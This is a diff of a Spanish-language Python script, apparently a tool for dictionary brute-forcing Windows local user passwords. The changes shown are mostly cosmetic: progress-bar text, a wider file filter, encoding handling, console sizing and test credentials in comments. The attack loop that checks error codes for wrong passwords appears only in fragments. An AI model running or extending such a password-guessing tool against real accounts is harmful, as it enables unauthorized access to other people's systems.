@@ -10,7 +10,7 @@
 #          ██║  ██╗██║  ██║██║ ╚═╝ ██║╚██████╔╝███████╗
 #          ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚══════╝
 #                                                         By: LawlietJH
-#                                                               v1.0.3
+#                                                               v1.0.4
 
 
 import msvcrt
@@ -21,8 +21,6 @@ from tkinter import filedialog, Tk
 
 
 
-Tk().withdraw()
-
 Banner = """
 
                   ██╗  ██╗ █████╗ ███╗   ███╗██╗   ██╗███████╗
@@ -32,8 +30,10 @@ Banner = """
                   ██║  ██╗██║  ██║██║ ╚═╝ ██║╚██████╔╝███████╗
                   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚══════╝
                                                          By: LawlietJH
-                                                               v1.0.3
+                                                               v1.0.4\
 """
+
+Tk().withdraw()
 
 #=======================================================================
 #=======================================================================
@@ -44,7 +44,7 @@ def GetFileName():
 	
 	Nombre = filedialog.askopenfile(initialdir = os.getcwd(),
 									title = "Selecciona Un Diccionario",
-									filetypes = (("Archivos de Texto","*.txt"),))
+									filetypes = (("Archivos de Texto","*.txt"),("Todos los Archivos","*.*")))
 	
 	if Nombre == None: return
 	
@@ -60,13 +60,14 @@ def Progreso(x, Total, Palabra):	# Imprime Una Barra De Progreso.
 	TiempoTransc = int(time.clock()) + 1
 	BarraAct = int(Actual * TamBar)
 	
-	bar = '\r Probando: {}\t Progreso: {:.2f}%'.format(Palabra, Progreso)
+	bar = '\r Progreso: {:.2f}%'.format(Progreso)
 	# ~ bar += ' |' + '█'.join(["" for _ in range(BarraAct)])  # Imprimir Progreso.
 	# ~ bar += ' '.join(['' for _ in range(int(TamBar - BarraAct))]) + '|'
 	bar += ' [' + Tiempo((Total - x) * (TiempoTransc / x))  + '] '	# Imprimir Tiempo Restante.
-	bar += '[{}/{} Palabras]'.format(x, Total)
+	bar += '[{}/{}] - Probando: {}\t\t'.format(x, Total, Palabra)
 	
-	sys.stdout.write(bar)
+	try: sys.stdout.write(bar)
+	except UnicodeEncodeError: return False
 
 
 def Tiempo(sec):	# Imprime El Tiempo Restante.
@@ -202,6 +203,9 @@ def GetUserData(Usuario):
 	# ~ print('\n ==============================================================================')
 
 
+#=======================================================================
+
+
 def InformacionDeUsuarios():
 	
 	Users = GetUsersName()
@@ -273,7 +277,7 @@ def FuerzaBruta(Usuario):
 	Words = []
 	Actual = 1
 	
-	sys.stdout.write('\n\n\t [+] Abriendo Diccionario!')
+	sys.stdout.write('\n\n [+] Abriendo Diccionario!')
 	
 	while True:
 		
@@ -284,20 +288,20 @@ def FuerzaBruta(Usuario):
 			print('\n\n\t No Elegiste Ningun Archivo')
 			os.system('Pause > Nul')
 			return
-	
+		
 		try: open(Diccio,'r')
 		except:
 			
-			print('\n\n\t No se pudo Abrir el Archivo .txt')
+			print('\n\n\t No se puede Abrir el Archivo ' + Diccio.split('.')[-1].upper())
 			time.sleep(2)
 			continue
 		
 		break
 	
-	with open(Diccio,'r') as File: Words = File.readlines()
+	with open(Diccio,'r',errors='ignore') as File: Words = File.readlines()
 	Total = len(Words)
 	
-	sys.stdout.write('\r\t [+] Comenzando el Ataque!\n\n')
+	sys.stdout.write('\r [+] Al Ataque!\t\t\t\n\n\n')
 	
 	for Passwd in Words:
 		
@@ -319,7 +323,10 @@ def FuerzaBruta(Usuario):
 			Err = error.__str__().replace('(','').replace(')','').replace('\'','').split(', ')[0]
 			
 			if int(Err) == 86:
-				Progreso(Actual, Total, Passwd)
+				if Progreso(Actual, Total, Passwd) == False:
+					sys.stdout.write('\r [!] Los Archivos .'+ Diccio.split('.')[-1].upper() +' No Son Compatibles.\t\t\t\t\t\t\t')
+					os.system('Pause > Nul')
+					return
 				Actual += 1
 			if int(Err) == 5:
 				# ~ print('\n\n El Usuario \'' + Usuario + '\' Nego El Acceso (Código 5).\n\n')
@@ -331,6 +338,8 @@ def FuerzaBruta(Usuario):
 
 def Main():
 	
+	os.system('MODE CON cols=80 lines=40')
+	
 	PassWD = ''
 	os.system('Cls')
 	
@@ -339,6 +348,8 @@ def Main():
 	Opc = GetChar('\n\n [+] Quieres Atacar a Este Usuario? [S/N]: ')
 	
 	if Opc.lower() in [b's',b'y']:
+		
+		os.system('MODE CON cols=100 lines=32')
 		
 		try:
 			os.system('Cls')
@@ -373,9 +384,9 @@ if __name__ == '__main__':
 	# Cambiando La Contraseña De Usuario Para Pruebas:
 	# ~ try:
 		
-		# ~ Usuario = 'Prueba'
-		# ~ ActPass = '12'
-		# ~ NewPass = '21'
+		# ~ Usuario = 'EnyLaine'
+		# ~ ActPass = '99'
+		# ~ NewPass = '12'
 		
 		# ~ ChangePasswordUser(ActPass, NewPass, Usuario)
 		
